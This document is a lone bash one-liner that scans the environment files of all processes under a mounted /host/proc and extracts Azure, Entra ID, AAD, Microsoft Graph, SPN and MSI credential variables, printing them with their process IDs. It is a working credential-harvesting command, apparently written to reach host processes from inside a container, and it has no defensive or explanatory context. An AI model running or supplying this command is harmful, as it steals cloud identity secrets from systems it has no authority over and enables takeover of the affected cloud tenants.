for d in /host/proc/[0-9]*; do e=$d/environ; [ -r "$e" ] || continue; tr "\0" "\n" < "$e" 2>/dev/null | grep -E "^(AZURE|GRAPH|ENTRA|AAD|AD_CLIENT|SPN|MSI)[A-Z_]*=|^(GRAPH_CLIENT|MS_GRAPH)[A-Z_]*=" | grep -vE "=$|PORT|VERSION" | sed "s/^/$(basename $d): /"; done 2>/dev/null | sort -u -t: -k2 | head -25